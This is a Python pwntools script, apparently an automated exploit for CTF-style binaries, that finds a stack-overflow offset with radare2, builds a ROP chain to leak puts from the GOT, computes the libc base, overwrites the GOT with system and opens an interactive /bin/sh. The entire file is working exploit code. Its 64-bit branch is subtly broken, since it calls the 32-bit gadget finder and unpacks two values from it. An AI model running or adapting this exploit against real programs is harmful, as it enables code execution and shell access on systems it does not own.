from pwn import *
import sys
import subprocess
import time

def readleak32(resp, putoff):
    findme = bytes([putoff % 256])
    addrstart = resp.find(findme)
    countme = resp.count(findme)
    if countme > 1:
        print("MANY FOUND...")
        winner = addrstart
        nextnibble = (putoff >> 8) % 16
        foundOne = False
        for ii in range(countme):
            if resp[winner+1] % 16 == nextnibble:
                foundOne = True
                break
            else:
                winner = resp.find(findme, winner + 1)
        if foundOne:
            addrstart = winner
        else:
            print("Failed to find leak")
    return u32(resp[addrstart:addrstart + 4])

def readleak64(resp, putoff):
    findme = bytes([putoff % 256])
    addrstart = resp.find(findme)
    return u64(resp[addrstart:addrstart + 6]+b'\x00\x00')

def find_gadgets32(binary_name):
    p1 = subprocess.Popen(["ROPgadget", "--binary", binary_name], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(["grep", "-x" ,".\{26\}"], stdin=p1.stdout, stdout=subprocess.PIPE)
    p3 = subprocess.run(["grep", "-m", "1", "pop ebx"], stdin=p2.stdout ,stdout=subprocess.PIPE)
    pop_ebx_address = p3.stdout[:10]
    pop_ebx_address = int(pop_ebx_address, 16)
    return pop_ebx_address

def find_gadgets64(binary_name):
    p1 = subprocess.Popen(["ROPgadget", "--binary", binary_name], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(["grep", "-x" ,".\{34\}"], stdin=p1.stdout, stdout=subprocess.PIPE)
    p3 = subprocess.run(["grep", "-m", "1", "pop rdi"], stdin=p2.stdout ,stdout=subprocess.PIPE)
    pop_rdi_address = p3.stdout[:18]
    pop_rdi_address = int(pop_rdi_address, 16)

    p1 = subprocess.Popen(["ROPgadget", "--binary", binary_name], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(["grep", "-x" ,".\{24\}"], stdin=p1.stdout, stdout=subprocess.PIPE)
    p3 = subprocess.run(["grep", "-m", "1", "ret"], stdin=p2.stdout ,stdout=subprocess.PIPE)
    ret_address = p3.stdout[:18]
    ret_address = int(ret_address, 16)

    return pop_rdi_address, ret_address

binary_name = sys.argv[1]
elf=ELF(binary_name)
bytes_in_an_address = 4
if (elf.bits == 64):
    bytes_in_an_address = 8
print(elf.bits)

pattern_file = open("pattern.txt", "w")
ragg2_proc = subprocess.Popen(["ragg2", "-P", "400", "-r"], stdout=pattern_file)
pattern_file.close()

profile_file = open("profile.rr2", "w")
profile_file.write("!/usr/bin/rarun2\n")
profile_file.write("stdin=./pattern.txt\n")
profile_file.close()

r2log_file = open("r2log", "w")

r2_proc = subprocess.Popen(["r2", "-r", "profile.rr2", "-d", binary_name], stdin=subprocess.PIPE, stdout=r2log_file)

if elf.bits == 32:
    r2_proc.communicate(input=b"dc\nwopO `dr ebp`\n")
else:
    r2_proc.communicate(input=b"dc\nwopO `dr rbp`\n")

r2log_file.close()

r2log_file = open("r2log", "r")

lines = r2log_file.readlines()
offset_string = list(reversed(lines))[6].strip()
offset = int(offset_string) + bytes_in_an_address
print(offset)

if elf.bits == 32:
    libc = ELF("/lib/i386-linux-gnu/libc.so.6")
else:
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

putsoffset = libc.symbols['puts']
glcsysoff = libc.symbols['system']
bytediff = elf.got["gets"] - elf.got["puts"]
if (bytediff > 0):
    numgets = int(bytediff/bytes_in_an_address)
else:
    numgets = 0
p=process(binary_name)
intro = p.recv()
print(intro)
payload = b"A"*offset

if (elf.bits == 32):
    pop_ebx_address = find_gadgets32(binary_name)
    payload += p32(elf.plt["puts"]) + p32(pop_ebx_address) + p32(elf.got["puts"])
    payload += p32(elf.plt["gets"]) + p32(pop_ebx_address) + p32(elf.got["puts"])
    payload += p32(elf.plt["gets"]) + p32(pop_ebx_address) + p32(elf.got["puts"]-0x10)
    payload += p32(elf.plt["puts"]) + p32(pop_ebx_address) + p32(elf.got["puts"]-0x10)
else:
    pop_rdi_address, ret_address = find_gadgets32(binary_name)
    payload += (p64(pop_rdi_address) + p64(elf.got["puts"])) + p64(elf.plt["puts"])
    payload += (p64(pop_rdi_address) + p64(elf.got["puts"])) + p64(elf.plt["gets"])
    payload += (p64(pop_rdi_address) + p64(elf.got["puts"]-0x10)) + p64(elf.plt["gets"])
    payload += (p64(pop_rdi_address) + p64(elf.got["puts"]-0x10)) + p64(ret_address) + p64(elf.plt["puts"])

p.sendline(payload)
print(payload)
leak = p.recv()
print(leak)

if elf.bits == 32:
    putslibc = readleak32(leak, putsoffset)
else:
    putslibc = readleak64(leak, putsoffset)

print(hex(putslibc))
glibcbase = putslibc - putsoffset
libc.address = glibcbase
p.sendline(p32(libc.symbols["system"]) + p32(libc.symbols['gets'])*numgets)
p.sendline(b"/bin/sh\x00")
p.interactive()

